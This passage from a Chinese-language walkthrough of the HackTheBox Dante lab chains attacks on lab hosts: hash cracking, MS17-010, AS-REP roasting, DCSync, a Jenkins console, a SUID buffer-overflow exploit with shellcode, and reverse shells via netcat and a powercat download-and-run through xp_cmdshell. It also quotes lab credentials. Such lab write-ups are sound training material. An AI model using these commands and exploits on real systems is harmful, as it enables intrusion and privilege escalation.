class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| groupID | memberID | email          | passMD5                                  |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| 2       | admin    | &lt;blank&gt;        | 21232f297a57a5a743894a0e4a801fc3 (admin) |</span><br><span class="line">| NULL    | ben      | ben@dante.htb  | 442179ad1de9c25593cabf625c0badb7         |</span><br><span class="line">| 3       | egre55   | egre55@htb.com | d6501933a2e0ea1f497b87473051417f         |</span><br><span class="line">| 1       | guest    | NULL           | NULL                                     |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br></pre></td></tr></table></figure><p>将这三个hash保存在一个文件里，然后john爆破，以下是爆破结果：</p><p><img src="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg"></p><p>得到了ben用户的密码，那看看ssh能不能再用这个密码连上去：</p><p><img src="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg"></p><p>可以连接上去，在当前目录下可以拿到flag。</p><h3 id="Minus-minus-plus"><a href="#Minus-minus-plus" class="headerlink" title="Minus + minus &#x3D; plus?"></a>Minus + minus &#x3D; plus?</h3><p>之后执行一下sudo -l看看能用sudo执行哪些命令：</p><p><img src="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg"></p><p>这个意思是指我们可以以任何人除了root的权限执行bash，而执行sudo –version可以看到sudo的版本为1.8.27，因此提权方式为sudo 1.8.27 - Security Bypass，执行<code>sudo -u#-1 /bin/bash</code>，可以以root权限执行任意命令：</p><p><img src="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg"></p><p>与此同时，我们可以发现在系统中还存在一个julian用户，尝试读取&#x2F;etc&#x2F;shadow，并用john爆破得到密码，得到一对帐号密码：julian:manchesterunited，相信我，这个密码会在后面用到。至此，DANTE-NIX04也成功getroot。</p><h3 id="Congratulations-to-a-perfect-pear"><a href="#Congratulations-to-a-perfect-pear" class="headerlink" title="Congratulations to a perfect pear"></a>Congratulations to a perfect pear</h3><p>之后我们看172.16.1.102，开放了80、135、139、443、445以及3306端口。在网站的下方我们可以看到这个站使用了<code>Online Marriage Registration System</code>：</p><p><img src="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg"></p><p>之后使用searchsploit来搜索这个框架，找到了一些POC：</p><p><img src="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg"></p><p>随便拉取一个POC来打：</p><p><img src="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg"></p><p>此时已经上传好了webshell了，只不过webshell的格式蚁剑连不上，依然把上面免杀之后的马上传，然后蚁剑连接即可：</p><p><img src="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg"></p><p><img src="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg"></p><p>flag在blake桌面目录下的flag.txt中</p><h3 id="MinatoTW-strikes-again"><a href="#MinatoTW-strikes-again" class="headerlink" title="MinatoTW strikes again"></a>MinatoTW strikes again</h3><p>接着上传一个利用msfvenom生成的马，然后执行得到一个meterpreter，得到meterpreter之后直接getsystem拿到system权限：</p><p><img src="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg"></p><p>至此DANTE-WS03也打完了。</p><h3 id="That-just-blew-my-mind"><a href="#That-just-blew-my-mind" class="headerlink" title="That just blew my mind"></a>That just blew my mind</h3><p>接下来看172.16.1.20，fscan扫描结果显示开放了22、80、135、139、443、445以及88端口。既然开放了88端口，那有可能是一台域控。fscan还显示存在ms17-010漏洞，那么用直接msf打就可以了：</p><p><img src="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg"></p><p>拿到meterpreter之后，直接就是system权限。之后我们会在katwamba的桌面目录下看到一个叫职工备份的xlsx文件：</p><p><img src="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg"></p><p>我们把它下载下来：</p><p><img src="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg"></p><p>观察这里，B列被隐藏了：</p><p><img src="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg"></p><p>我们将它还原出后，可以得到A列username，B列password。对了，执行<code>net user mrb3n</code>有惊喜哦。之后我们通过调用msf的kiwi模块可以抓取到一对帐号密码，<code>xadmin:Peacemaker!</code>，还是一个域管。不过令人悲伤的是，dante.local这个域中似乎只有DANTE-DC01这一台机子了，以下是通过ldapsearch搜索得到的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># proxychains4 ldapsearch -x -H ldap://172.16.1.20:389 -D &quot;CN=xadmin,CN=Users,DC=DANTE,DC=local&quot; -w Peacemaker! -b &quot;DC=DANTE,DC=local&quot; &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; CN | grep cn  </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.20:389  ...  OK</span><br><span class="line">cn: DANTE-DC01</span><br></pre></td></tr></table></figure><p>因此拿到域管账户似乎也无济于事。</p><h3 id="Update-the-policy"><a href="#Update-the-policy" class="headerlink" title="Update the policy!"></a>Update the policy!</h3><p>那接着我们看172.16.1.101这台机子，nmap扫描之后开放的端口有21、135、139、445、5040、5985。之后尝试ftp匿名登录，无果。尝试利用之前excel中拿到的username和password爆破：</p><p><img src="https://pic.imgdb.cn/item/646252f30d2dde57779d66b2.jpg"></p><p>得到一组可以成功登录ftp的帐号密码：<code>dharding:WestminsterOrange5</code>，ftp登录后，得到一个叫”Remote login.txt“的文件，文件内容如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dido,</span><br><span class="line">I&#x27;ve had to change your account password due to some security issues we have recently become aware of</span><br><span class="line"></span><br><span class="line">It&#x27;s similar to your FTP password, but with a different number (ie. not 5!)</span><br><span class="line"></span><br><span class="line">Come and see me in person to retrieve your password.</span><br><span class="line"></span><br><span class="line">thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>提示dharding的账户密码与FTP密码类似，只是最后一位数字5发生了改变，那我们先用for循环生成一个密码字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;0..100&#125;;do echo &quot;WestminsterOrange$i&quot; &gt;&gt; pass1.txt;done</span><br></pre></td></tr></table></figure><p>之后用cme开始爆破，成功得到账户密码为<code>dharding:WestminsterOrange17</code>：</p><p><img src="https://pic.imgdb.cn/item/646252b80d2dde57779c9e54.jpg"></p><p>用evil-winrm登录即可在桌面拿到flag：</p><p><img src="https://pic.imgdb.cn/item/646253470d2dde57779e74e7.jpg"></p><h3 id="Single-or-double-quotes"><a href="#Single-or-double-quotes" class="headerlink" title="Single or double quotes"></a>Single or double quotes</h3><p>之后我们可以在“C:\Program Files (x86)\IObit”目录下看到“IObit Uninstaller”，查看IObit Uninstaller目录下的History.txt：</p><p><img src="https://pic.imgdb.cn/item/6462595b0d2dde5777ad58f2.jpg"></p><p>该版本的IObit Uninstaller存在通过可信任服务路径提权的问题。但是此处我们却不是通过这个问题来提权的，我们执行一下<code>cmd.exe /c &quot;sc qc IObitUnSvr&quot;</code>，结果如下：</p><p><img src="https://pic.imgdb.cn/item/646259c00d2dde5777ae4234.jpg"></p><p>可以看到IObitUnSvr服务的二进制路径中已经不存在空格了。但是这个服务是以system权限启动的，所以我们可能仍然需要通过这个服务来提权，只是需要另寻它法。因为这台机子powershell的执行策略，我们不能直接使用Get-ServiceAcl.ps1获取服务的ACL，执行<code>Get-ExecutionPolicy</code>可以看到执行策略显示Restricted：</p><p><img src="https://pic.imgdb.cn/item/646257b60d2dde5777a956e2.jpg"></p><p>直接执行Set-ExecutionPolicy Unrestricted又会提示我们拒绝更改。可以利用以下语句查看：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-Module C:\Users\dharding\Documents\Get-ServiceAcl.ps1;&#x27;IObitUnSvr&#x27; | Get-ServiceAcl | select -ExpandProperty Access&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>结果为：</p><p><img src="https://pic.imgdb.cn/item/6462584e0d2dde5777aaea36.jpg"></p><p>可以看到dharding用户拥有查询、更改“IObitUnSvr”服务配置的权限，还拥有开始和关闭该服务的权限。那这直接改IObitUnSvr服务的二进制路径不就直接getsystem了吗？接下来我们上传一个nc程序，之后利用以下语句更改服务的二进制程序路径：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config IObitUnSvr binPath=<span class="string">&quot;cmd.exe /c C:\Users\dharding\Desktop\nc64.exe -e cmd.exe 10.10.14.2 1238&quot;</span></span><br></pre></td></tr></table></figure><p>执行之后再次查看服务配置，可以看到二进制程序路径已经发生了改变：</p><p><img src="https://pic.imgdb.cn/item/64625c2f0d2dde5777b3a3c9.jpg"></p><p>之后sc stop IObitUnSvr再sc start IObitUnSvr重启服务，即可拿到system shell：</p><p><img src="https://pic.imgdb.cn/item/64625c600d2dde5777b40ebb.jpg"></p><h3 id="An-open-goal"><a href="#An-open-goal" class="headerlink" title="An open goal"></a>An open goal</h3><p>接着我们看172.16.1.5这台机子，fscan扫描结果显示开放了21、135、139、445以及1433端口，1433端口一般被mssql占用。 首先ftp匿名登录，拿到第一个flag：</p><p><img src="https://pic.imgdb.cn/item/64625e1c0d2dde5777b7e878.jpg"></p><p>因为没有帐号和密码，我们无法连接smb和mssql，因此这台机子先暂时搁置。打后面的机子再看看有没有线索。</p><h3 id="It’s-getting-hot-in-here"><a href="#It’s-getting-hot-in-here" class="headerlink" title="It’s getting hot in here"></a>It’s getting hot in here</h3><p>因为之前的Dante-DC01通过ms17-010打经常session维持不起来，没一会儿就掉了，所以我这里是利用之前得到的域管帐号通过evil-winrm登录进去，并上传msf马，运行木马拿到的meterpreter。，执行ipconfig之后看到有三张网卡：</p><p><img src="https://pic.imgdb.cn/item/646261570d2dde5777c1248d.jpg"></p><p>猜测可能还存在一个网段，利用以下cmd命令扫一下172.16.2.0&#x2F;24这个段吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/6462623a0d2dde5777c2f8b7.jpg"></p><p>发现还有一台IP为172.16.2.5的主机。之后添加路由，把172.16.2.0&#x2F;24这个段给添加进来（run autoroute -s 172.16.2.0&#x2F;24），扫一波端口：</p><p><img src="https://pic.imgdb.cn/item/646264930d2dde5777c7aaf6.jpg"></p><p>这台主机运行着DNS、Kerberos还有LDAP，应该又是一台DC。建立一条代理：</p><p><img src="https://pic.imgdb.cn/item/646266d50d2dde5777cc4c77.jpg"></p><p>之后我们会通过这条代理打172.16.2.5。故技重施利用ms17-010打172.16.2.5，没成功：</p><p><img src="https://pic.imgdb.cn/item/6462676d0d2dde5777cd60cb.jpg"></p><p>那接下来就对域内用户进行枚举吧。了解Kerberos协议的师傅应该知道域内用户枚举的原理，大致就是因为AS_REQ发送的请求包中cname字段的正确与否，导致AS_REP响应包的不同来进行枚举的。首先我们进行端口转发，把88端口和53端口转发到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5</span><br><span class="line">portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5</span><br></pre></td></tr></table></figure><p>之后使用kerbrute进行域用户名枚举，用户名字典是之前从excel文件中读到那些username：</p><p><img src="https://pic.imgdb.cn/item/64626de60d2dde5777d89f05.jpg"></p><p>之后利用cme爆破密码，跑了一夜，睡觉去了，醒来发现没结果，我知道是时候放弃直接爆破密码了。此时我们手上已经有了一个域用户的username，但没有该用户的密码，因此无法进行Kerberoasting攻击，但是可以进行AS_REP Roasting攻击。AS_REP Roasting攻击是因为域用户勾选了”不要求Kerberos预身份验证“的选项，攻击者进行AS_REQ之后，KDC会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回，即AS_REP。攻击者可以对由用户的NTLM Hash加密之后的Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。 impacket的GetNPUsers.py脚本为我们提供了进行AS_REP Roasting攻击的工具：</p><p><img src="https://pic.imgdb.cn/item/646273290d2dde5777e05761.jpg"></p><p>之后我们利用john对该Hash进行爆破：</p><p><img src="https://pic.imgdb.cn/item/646274830d2dde5777e2716c.jpg"></p><p>之后利用evil-winrm登录就行了，Desktop目录下拿到flag：</p><p><img src="https://pic.imgdb.cn/item/646274fe0d2dde5777e30ea3.jpg"></p><h3 id="One-misconfig-to-rule-them-all"><a href="#One-misconfig-to-rule-them-all" class="headerlink" title="One misconfig to rule them all"></a>One misconfig to rule them all</h3><p>之后我们上传SharpHound.exe采集数据，导入进BloodHound，点击分析里的<code>Find Principalswith DCSync Rights</code>选项卡，可以发现jbercov可以对dante.admin域进行DCSync攻击。利用impacket的secretsdump.py脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py dante/jbercov:myspace7@172.16.2.5 -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>抓到了Administrator的密码Hash：</p><p><img src="https://pic.imgdb.cn/item/64627ad50d2dde5777e91601.jpg"></p><p>之后我们可以通过PTH的方法配合使用psexec工具来拿到system权限：</p><p><img src="https://pic.imgdb.cn/item/64627c730d2dde5777ebf3f8.jpg"></p><p>也可以通过msf的psexec模块来返回一个meterpreter：</p><p><img src="https://pic.imgdb.cn/item/64627dff0d2dde5777ed71af.jpg"></p><p>之后我们上传chisel，创建一条代理：</p><p><img src="https://pic.imgdb.cn/item/64627e260d2dde5777ed8a8f.jpg"></p><p>在C:\Users\Administrator\Documents目录处存在一个Jenkins.bat文件，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Admin_129834765 SamsungOctober102030 /add</span><br></pre></td></tr></table></figure><h3 id="We’re-going-in-circles"><a href="#We’re-going-in-circles" class="headerlink" title="We’re going in circles"></a>We’re going in circles</h3><p>在172.16.1.19的8080端口上运行着Jenkins服务，利用密码可以成功登录：</p><p><img src="https://pic.imgdb.cn/item/6462803c0d2dde5777eecc0b.jpg"></p><p>接着我们进入&#x2F;script目录，利用以下语句进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;ls -al&quot;.execute().text</span><br></pre></td></tr></table></figure><p>之后拿到meterpreter，此时用户为jenkins:</p><p><img src="https://pic.imgdb.cn/item/6462819a0d2dde5777eff151.jpg"></p><p>之后上传pspy发现以下进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/13 10:23:01 CMD: UID=0    PID=12129  | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC</span><br></pre></td></tr></table></figure><p>得到一组帐号密码：<code>ian:VPN123ZXC</code>，直接su切换至ian用户，发现在disk组里：</p><p><img src="https://pic.imgdb.cn/item/646282340d2dde5777f098c5.jpg"></p><p>hacktricks里对disk组提权的方法进行了介绍：<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a> 首先我们看看&#x2F;dev设备里有哪些所属组是disk：</p><p><img src="https://pic.imgdb.cn/item/6462831f0d2dde5777f12980.jpg"></p><p>之后执行<code>df -h</code>看看根目录被挂载到了哪里：</p><p><img src="https://pic.imgdb.cn/item/6462835e0d2dde5777f14d65.jpg"></p><p>根目录被挂在到了&#x2F;dev&#x2F;sda5，之后就与hacktricks中介绍的方法类似了：</p><p><img src="https://pic.imgdb.cn/item/6462b1330d2dde577712466e.jpg"></p><h3 id="My-cup-runneth-over"><a href="#My-cup-runneth-over" class="headerlink" title="My cup runneth over"></a>My cup runneth over</h3><p>接下来我们在DC02中执行如下cmd命令来探测172.16.2.0&#x2F;24网段的存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find &quot;Reply&quot;</span><br></pre></td></tr></table></figure><p>结果为：</p><p><img src="https://pic.imgdb.cn/item/646285760d2dde5777f2881f.jpg"></p><p>该网段还存在一个IP为172.16.2.101的主机，使用auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp模块探测一下开放的端口，发现开放了22端口。我们将22端口转发到本地：</p><p><img src="https://pic.imgdb.cn/item/64628cbd0d2dde5777f8b156.jpg"></p><p>尝试爆破一下ssh帐号和密码，用户名字典和密码字典都是从之前的excel文件中得到的。还记得我们之前爆破得出的<code>julian:manchesterunited</code>这对帐号密码吗？我们将它一起添加进字典中，使用hydra爆破，结果正是之前得到的julian：</p><p><img src="https://pic.imgdb.cn/item/64628c9b0d2dde5777f89d31.jpg"></p><p>接着用ssh登录后，尝试SUID提权：</p><p><img src="https://pic.imgdb.cn/item/64628ed70d2dde5777f9941c.jpg"></p><p>发现&#x2F;usr&#x2F;sbin&#x2F;readfile被设置了SUID位，复制到本地，利用<a href="https://dogbolt.org/">https://dogbolt.org/</a> 在线反编译站点对这个二进制文件进行反编译，观察Ghidra模块，其中主函数如下所示：</p><p><img src="https://pic.imgdb.cn/item/64628fa00d2dde5777fa2cf1.jpg"></p><p>首先判断我们是否传入了参数，如果没有则输出<code>&quot;Syntax: %s &lt;/path/to/file&gt;\n</code>。否则，就将真实、有效且已保存的用户或组ID设置为root。接下来还调用了strcpy()函数，将用户输入param2复制到local_58缓冲区。local_58缓冲区长度为80,如果超过80,则会导致缓冲区溢出，并且可以用来获得主机上的root访问权限。 接下来我们执行gdb readfile，gdb还安装了peda插件，执行checksec检查二进制的各种安全选项：</p><p><img src="https://pic.imgdb.cn/item/646291440d2dde5777fb2fe8.jpg"></p><p>之后，我们检查ASLR：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/646291d70d2dde5777fb773e.jpg"></p><p>可以看到，ASLR被关闭。使用gdb，我们生成一个100字节的模式，并使用r参数运行程序：</p><p><img src="https://pic.imgdb.cn/item/646292c90d2dde5777fbe1e7.jpg"></p><p>可以看到RSP指向我们有效载荷的一部分（AAKAAgAA6AAL）。我们搜索这个偏移量在哪里</p><p><img src="https://pic.imgdb.cn/item/6462933e0d2dde5777fc0edf.jpg"></p><p>偏移量是88，因此我们用python生成88个’A’和8个’B’：</p><p><img src="https://pic.imgdb.cn/item/646293b40d2dde5777fc42c9.jpg"></p><p>可以看到RSP被8个’B’给填满。我们可以把B替换为我们shellcode的地址。64位的shellcode可以从<a href="http://shell-storm.org/shellcode/files/shellcode-806.html">这里</a>调用&#x2F;bin&#x2F;sh，其中”\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”一共是27个byte，接着我们执行下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r $(python2 -c &#x27;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;B&quot;*6&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/646295d90d2dde5777fd1790.jpg"></p><p>我们将使用以下命令分析堆栈的前120个字节：</p><p><img src="https://pic.imgdb.cn/item/646296620d2dde5777fd792c.jpg"></p><p>没找到shellcode，可以通过删除200个字节来分析RSP之前的内存内容：</p><p><img src="https://pic.imgdb.cn/item/646297210d2dde5777fe402c.jpg"></p><p>此时找到了shellcode。shellcode出现在内存表示中的第二个八位字节中。下一个地址是0x7fffffffe378。我们可以通过从下一个字节中删除8个字节来计算shellcode地址，0x7fffffffe370。之后我们用这个地址来代替这些’B’：</p><p><img src="https://pic.imgdb.cn/item/646298550d2dde5777ffdf7c.jpg"></p><p>可以看到已经成功进入shell了，可是执行id之后发现是julian：</p><p><img src="https://pic.imgdb.cn/item/646298ae0d2dde57770088c2.jpg"></p><p>这很正常，因为gdb调试二进制文件的时候不会提升权限。接着我们执行<code>/usr/sbin/readfile $(python2 -c &#39;print &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot; + &quot;A&quot;*(88-27) + &quot;\x70\xe3\xff\xff\xff\x7f&quot;&#39;)</code>，结果为：</p><p><img src="https://pic.imgdb.cn/item/6462998b0d2dde5777016720.jpg"></p><p>这里的原因是gdb在堆栈中保留了一些环境变量，因此我们的shellcode在有gdb和没有gdb的情况下有不同的地址。 我们可以通过将外壳代码存储在env变量中来执行相同的攻击，然后可以指向堆栈到此变量的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python2 -c &#x27;print&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;&#x27;`</span><br></pre></td></tr></table></figure><p>SHELLCODE变量的地址可以通过以下代码获得：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *ptr;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = getenv(argv[<span class="number">1</span>]); <span class="comment">/* get env var location */</span></span><br><span class="line">  ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>]))*<span class="number">2</span>; <span class="comment">/* adjust for program name */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后我们编译上面这段代码并运行生产的二进制文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc getenv.c -o getenv &amp;&amp; <span class="built_in">chmod</span> +x getenv &amp;&amp; ./getenv SHELLCODE /usr/sbin/readfile</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/64629b310d2dde577702312a.jpg"></p><p>最后我们调整调用，这次使用了新地址，成功getroot：</p><p><img src="https://pic.imgdb.cn/item/6462b1730d2dde5777126ddf.jpg"></p><h3 id="What-do-we-have-here"><a href="#What-do-we-have-here" class="headerlink" title="What do we have here?!"></a>What do we have here?!</h3><p>接着我们再在这台机子上通过以下命令来查看存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..255&#125; ;do (ping -c 1 172.16.2.$i | grep &quot;bytes from&quot;|cut -d &#x27; &#x27; -f4|tr -d &#x27;:&#x27; &amp;);done</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/64629c580d2dde577702b8d4.jpg"></p><p>找到了一台新机子，IP为172.16.2.6。通过扫描端口，发现开启了22端口和631端口，我们再次使用julian的帐号连上去，可以直接拿到flag：</p><p><img src="https://pic.imgdb.cn/item/6462b1930d2dde57771285b7.jpg"></p><p>接着我们在Desktop目录下找到一个SQL文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">julian@DANTE-ADMIN-NIX06:~/Desktop$ cat SQL</span><br><span class="line">Hi Julian</span><br><span class="line">I&#x27;ve put this on your personal desktop as its probably the most secure </span><br><span class="line">place on the network!</span><br><span class="line"></span><br><span class="line">Can you please ask Sophie to change her SQL password when she logs in</span><br><span class="line">again? I&#x27;ve reset it to TerrorInflictPurpleDirt996655 as it stands, but</span><br><span class="line">obviously this is a tough one to remember</span><br><span class="line"></span><br><span class="line">Maybe we should all get password managers?</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">James</span><br></pre></td></tr></table></figure><p>得到一组帐号密码<code>sophie:TerrorInflictPurpleDirt996655</code>。</p><h3 id="It-doesn’t-get-any-easier-than-this"><a href="#It-doesn’t-get-any-easier-than-this" class="headerlink" title="It doesn’t get any easier than this"></a>It doesn’t get any easier than this</h3><p>之后还可以在home目录下找到一个名为plongbottom的用户，而这个用户也正好在我们之前得到的那个excel文件里。因此我们直接su切换至该用户。之后执行sudo -l后，发现可以sudo执行任何命令，那直接sudo去看root目录下的flag即可：</p><p><img src="https://pic.imgdb.cn/item/64629de90d2dde577703bf5e.jpg"></p><h3 id="Fail-2-The-Sequel"><a href="#Fail-2-The-Sequel" class="headerlink" title="Fail 2: The Sequel"></a>Fail 2: The Sequel</h3><p>接下来，我们回过头来看172.16.1.5这台机子，之前因为没有线索而将它暂时搁置了。现在我们拿到了sophie的帐号密码，可以尝试登录一下了。利用impacket中的mssqlclient可以进行登录：</p><p><img src="https://pic.imgdb.cn/item/64629e810d2dde5777041141.jpg"></p><p>接着开始提权，首先执行<code>select is_srvrolemember(&#39;sysadmin&#39;);</code>判断当前是否为DBA权限，为1则可以提权：</p><p><img src="https://pic.imgdb.cn/item/64629edc0d2dde57770439c4.jpg"></p><p>接着我们 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭： <code>select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;</code></p><p><img src="https://pic.imgdb.cn/item/64629f180d2dde5777045812.jpg"></p><p>可以使用xp_cmdshell，我这里使用powercat来反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.14.2:1241/powercat.ps1\&quot;);powercat -c 10.10.14.2 -p 1242 -e cmd&quot;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/6462a06c0d2dde577704feac.jpg"></p><p>在C:\DB_backups目录下发现一个名叫db_backup.ps1的文件，尝试读取：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 